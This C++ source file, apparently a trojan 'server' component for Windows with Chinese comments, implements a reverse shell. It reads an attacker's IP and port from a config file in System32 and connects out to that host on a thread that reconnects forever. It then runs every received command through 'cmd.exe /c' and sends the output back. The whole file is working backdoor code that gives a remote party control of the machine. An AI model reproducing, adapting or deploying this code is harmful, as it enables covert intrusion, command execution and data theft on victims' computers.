#include "pch.h"
#include "TroServer.h"
#include <stdio.h>
#include<direct.h>
#include<iostream>

#include<fstream>
#include <Winsock2.h>
#include<WS2tcpip.h>
#include<Windows.h>
#include "CMDEXPLAINER.h"
#pragma comment(lib, "WS2_32")  // 链接到WS2_32.lib


#define configFile "C:/Windows/System32/config.txt"


void connnect()
{
    //读取配置文件，配置ip/port
    ifstream ifs;
    string ip="",port="";

    ifs.open(configFile, ios::in);
    if (!ifs.is_open()) {
        MessageBoxA(NULL, "配置文件打开失败", "Server", 0);
        return;
    }
    char buff[1024] = { 0 };
    while (ifs.getline(buff, sizeof(buff))) {
        vector<string> strs = split(buff);
        
        if (strs.size() != 2) {
            continue;
        }
        if (strs[0]._Equal("ip")) {
            ip = strs[1];
            
        }
        else if (strs[0]._Equal("port")) {
            port = strs[1];
        }
    }
    if (ip._Equal("") || port._Equal("")) {
        //MessageBoxA(NULL, "配置文件损坏，无法找到ip或端口配置", "Server", 0);
        return;
    }
    WCHAR CLIENTIP[100] = { 0 };
    wstring ws = str2wstr(ip).c_str();
    for (int i = 0; i < ip.length(); i++) {
        CLIENTIP[i] = ws[i];
    }
    u_short CLIENTPORT = atoi(port.c_str());


    //初始化
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(1, 1);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        return;
    }

    if (LOBYTE(wsaData.wVersion) != 1 ||
        HIBYTE(wsaData.wVersion) != 1) {
        WSACleanup();
        return;
    }
    SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);

    SOCKADDR_IN addrSrv = SOCKADDR_IN();
    InetPtonW(AF_INET, CLIENTIP, (void*)&addrSrv.sin_addr.S_un.S_addr);
    addrSrv.sin_family = AF_INET;
    addrSrv.sin_port = htons(CLIENTPORT);
    connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
    
    while (true) {
        sendCurrentPath(sockClient);//在接收命令前发送当前路径
        //receive control command and execute it;
        char recvBuf[100];
        memset(recvBuf, 0, sizeof(recvBuf));
        int recvLength=recv(sockClient, recvBuf, sizeof(recvBuf)-1, 0);
        if (recvLength <= 0) {
            //MessageBoxA(NULL, "Client Closed", "LYSM", 0);
            break;
        }
        if (0 == strcmp(recvBuf, "close")) {
            break;
        }
        //execute the cmd and sned the reply
        process_cd(recvBuf);
        string cmd = "cmd.exe /c ";
        cmd.append(recvBuf);
        string res = execute(cmd);
        
        int resLength = res.length();
        char resLengthStr[11] = { 0 };
        sprintf_s(resLengthStr, "%010d", resLength);
        res = resLengthStr + res;
        //MessageBoxA(NULL, res.c_str(), "LYSM", 0);
        send(sockClient, res.c_str(), res.length(), 0);
        
        
    }
    closesocket(sockClient);
    WSACleanup();
}

void sendCurrentPath(SOCKET sockClient)
{
    const int size = 640;
    char dst[size] = { 0 };
    _getcwd(dst, size);

    string res = dst;

    int resLength = res.length();
    char resLengthStr[11] = { 0 };
    sprintf_s(resLengthStr, "%010d", resLength);
    res = resLengthStr + res;
    send(sockClient, res.c_str(), res.length(), 0);

}

DWORD WINAPI Fun(LPVOID lpParameter)
{
    while (true)
    {
        connnect();
    }
    return 0L;
}



void create_thread()
{
    HANDLE hThread = CreateThread(NULL, 0, Fun, NULL, 0, NULL);
    CloseHandle(hThread);
}

